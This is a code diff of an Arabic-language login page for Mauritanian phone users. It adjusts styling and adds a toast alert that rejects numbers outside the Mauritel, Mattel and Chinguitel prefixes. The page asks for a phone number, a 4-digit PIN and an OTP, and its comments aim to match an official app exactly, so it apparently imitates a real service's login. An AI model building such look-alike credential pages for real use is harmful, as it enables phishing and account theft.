@@ -97,7 +97,7 @@
         /* مجموعات الإدخال */
         .input-group {
             width: 100%;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
             position: relative;
             text-align: right;
         }
@@ -107,36 +107,24 @@
             font-size: 0.95rem;
             font-weight: bold;
             color: #111;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
 
         /* حاوية الحقل مع الأيقونة */
         .input-wrapper {
             position: relative;
             width: 100%;
-            border-bottom: 1px solid #111; /* خط سفلي نحيف واحترافي */
         }
 
-        /* عنصر رمز الدولة الثابت جهة اليسار */
-        .country-code-prefix {
-            position: absolute;
-            left: 2px;
-            bottom: 6px;
-            font-size: 1.25rem;
-            font-weight: 500;
-            color: #222;
-            direction: ltr !important;
-            z-index: 5;
-        }
-
-        /* حقل الهاتف المستمر مع إعطاء مسافة بادئة لرمز الدولة على اليسار وللأيقونة على اليمين */
+        /* حقل الهاتف المستمر مع تطبيق خاصية LTR ومحاذاة النص والاتجاه بالكامل */
         .main-input {
             width: 100%;
             border: none;
-            padding: 6px 40px 6px 55px; /* مسافة 55px من اليسار لعدم تداخل النص مع +222 */
-            font-size: 1.25rem;
+            border-bottom: 1.5px solid #222;
+            padding: 8px 45px 8px 15px;
+            font-size: 1.2rem;
             outline: none;
-            color: #222;
+            color: #333;
             background: transparent;
             
             /* تفعيل الـ LTR بشكل صارم وسليم للحقل */
@@ -146,51 +134,49 @@
         }
 
         .main-input::placeholder {
-            color: #ccc;
+            color: #b8b8b8;
             font-size: 1.1rem;
             direction: ltr;
             text-align: left;
         }
 
-        /* الأيقونات الثابتة في مكانها الرسمي جهة اليمين ملاصقة ومحاذية للخط */
+        /* الأيقونات الثابتة في مكانها الرسمي جهة اليمين */
         .field-icon {
             position: absolute;
-            right: 2px;
-            bottom: 6px;
+            right: 5px;
+            bottom: 10px;
             width: 22px;
             height: 22px;
-            color: #111;
+            color: #333;
             z-index: 5;
         }
 
-        /* تعديل الموضع ليصبح في الجهة اليمنى بمحاذاة الأيقونة وبدون فجوات علوية */
+        /* تعديل الموضع ليصبح في الجهة اليمنى (الأصلي) بمحاذاة الأيقونة */
         .password-wrapper-box {
             display: flex;
             justify-content: flex-end; 
             width: 100%;
-            padding-right: 40px; 
-            margin-top: -2px;
+            padding-right: 45px; 
         }
 
         /* حاوية حقول الرقم السري مرتبة في اليمين مع إبقاء الاتجاه العام للحقول LTR */
         .password-container {
             display: flex;
-            gap: 16px; 
+            gap: 15px; 
             width: auto; 
             direction: ltr !important; 
         }
 
         /* الحفاظ الصارم على عدم الكتابة من اليمين أو الوسط داخل الخانة مع تدفق LTR */
         .password-field {
-            width: 22px;
-            height: 30px;
+            width: 24px;
+            height: 35px;
             border: none;
-            border-bottom: 1.5px solid #111; 
+            border-bottom: 2px solid #222;
             font-size: 1.4rem;
             font-weight: bold;
             outline: none;
             background: transparent;
-            padding-bottom: 2px;
             
             direction: ltr !important;
             text-align: left !important; 
@@ -209,13 +195,13 @@
         .forgot-password-box {
             width: 100%;
             text-align: right;
-            padding-right: 40px; 
-            margin-top: 15px; 
+            padding-right: 45px; 
+            margin-top: 12px; 
             margin-bottom: 15px;
         }
 
         .forgot-password-box a {
-            color: #111;
+            color: #222;
             text-decoration: underline;
             font-size: 0.92rem;
             font-weight: 500;
@@ -224,13 +210,13 @@
         /* الرابط السفلي المخصص للمستخدم الجديد */
         .register-link-box {
             margin-top: auto; 
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             text-align: center;
             width: 100%;
         }
 
         .register-link-box a {
-            color: #111;
+            color: #222;
             text-decoration: underline;
             font-size: 0.92rem;
             font-weight: 500;
@@ -247,7 +233,6 @@
             margin-bottom: 40px;
         }
 
-        /* حقل الـ OTP متمركز في المنتصف تماماً */
         .otp-wrapper-box {
             display: flex;
             justify-content: center; 
@@ -261,12 +246,11 @@
             direction: ltr !important;
         }
 
-        /* تطبيق خاصية LTR الصارمة لحقول OTP */
         .otp-field {
             width: 32px;
             height: 40px;
             border: none;
-            border-bottom: 2px solid #111;
+            border-bottom: 2px solid #222;
             font-size: 1.5rem;
             font-weight: bold;
             outline: none;
@@ -299,7 +283,7 @@
             margin-bottom: 25px;
         }
 
-        /* النص المستبدل بدلاً من الدائرة الخضراء لتطابق الرسمية */
+        /* التصميم الخاص بكلمة "رمز التاكيد" بدلاً من الدائرة الخضراء لتطابق التطبيق الرسمي */
         .otp-confirmation-text {
             font-size: 1.15rem;
             font-weight: bold;
@@ -308,6 +292,58 @@
             text-align: center;
             display: block;
             width: 100%;
+        }
+
+        /* تصميم كرت التنبيه السفلي المنبثق (Toast Alert) المطابق للفيديو تماماً */
+        .custom-toast-alert {
+            position: absolute;
+            bottom: 85px; /* يظهر فوق زر تسجيل الدخول مباشرة */
+            left: 5%;
+            width: 90%;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            direction: rtl;
+            text-align: right;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: all 0.3s ease-in-out;
+            visibility: hidden;
+            z-index: 999;
+        }
+
+        .custom-toast-alert.show {
+            transform: translateY(0);
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .toast-icon-box {
+            background-color: #f1f3f4;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .toast-icon-box span {
+            color: #5f6368;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .toast-text {
+            font-size: 0.88rem;
+            color: #202124;
+            font-weight: 500;
+            line-height: 1.4;
         }
 
         /* الزر السفلي الأصفر الثابت */
@@ -350,7 +386,6 @@
             <div class="input-group">
                 <label>اسم المستخدم أو رقم الهاتف</label>
                 <div class="input-wrapper">
-                    <span class="country-code-prefix">+222</span>
                     <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="من 8 أرقام" oninput="cleanNumberInput(this)">
                     <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M5.5 21a8.5 8.5 0 0 1 13 0"/></svg>
                 </div>
@@ -403,6 +438,15 @@
             </div>
         </div>
 
+        <div id="toastAlert" class="custom-toast-alert">
+            <div class="toast-icon-box">
+                <span>!</span>
+            </div>
+            <div class="toast-text">
+                رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شنقيتل)
+            </div>
+        </div>
+
         <button class="footer-button" id="submitBtn" onclick="onFooterButtonClick()">تسجيل الدخول</button>
 
     </div>
@@ -420,9 +464,24 @@
             }
         });
 
-        // تنظيف مدخلات الأرقام لحقل الهاتف
+        // تنظيف مدخلات الأرقام لحقل الهاتف والتحقق الذكي من الشبكات الموريتانية المعتمدة
         function cleanNumberInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
+            
+            const toast = document.getElementById('toastAlert');
+            
+            // عندما يكتمل كتابة الـ 8 أرقام يتم فحص البداية (الشركات الموريتانية تبدأ بـ 2 أو 3 أو 4)
+            if (input.value.length === 8) {
+                const firstDigit = input.value.charAt(0);
+                if (firstDigit !== '2' && firstDigit !== '3' && firstDigit !== '4') {
+                    toast.classList.add('show'); // إظهار التنبيه
+                } else {
+                    toast.classList.remove('show'); // إخفاء التنبيه إذا كان صحيحاً
+                }
+            } else {
+                // إخفاء التنبيه تلقائياً إذا قام بحذف أي رقم أو لم يكمل 8 أرقام
+                toast.classList.remove('show');
+            }
         }
 
         // حركة التنقل التلقائي وخلفي لحقول الرقم السري الأربعة (تبدأ وتتحرك من اليسار فقط)
@@ -470,6 +529,7 @@
             const titleText = document.getElementById('titleText');
             const backArrow = document.getElementById('backArrow');
             const submitBtn = document.getElementById('submitBtn');
+            const toast = document.getElementById('toastAlert');
 
             if (!loginSection.classList.contains('hidden')) {
                 const userVal = document.getElementById('usernameInput').value.trim();
@@ -486,6 +546,13 @@
                     alert("يجب إدخال رقم الهاتف كاملاً والمكون من 8 أرقام.");
                     return;
                 }
+
+                // منع الانتقال في حالة ظهور التنبيه السلبي لرقم الهاتف
+                if (toast.classList.contains('show')) {
+                    alert("الرجاء إدخال رقم هاتف موريتاني صحيح تابع لـ (موريتل، ماتل، شنقيتل).");
+                    return;
+                }
+
                 if (passVal.length !== 4) {
                     alert("يجب إدخال الرقم السري كاملاً والمكون من 4 أرقام.");
                     return;
@@ -496,6 +563,7 @@
                 titleText.innerText = "رمز التحقق";
                 backArrow.style.display = "block";
                 submitBtn.innerText = "التحقق";
+                toast.classList.remove('show'); // إخفاء التنبيه عند الذهاب لواجهة الـ OTP
                 
             } else {
                 let otpCode = "";
@@ -522,6 +590,7 @@
             document.getElementById('titleText').innerText = ""; 
             document.getElementById('backArrow').style.display = "none";
             document.getElementById('submitBtn').innerText = "تسجيل الدخول";
+            document.getElementById('toastAlert').classList.remove('show');
         }
     </script>
 </body>
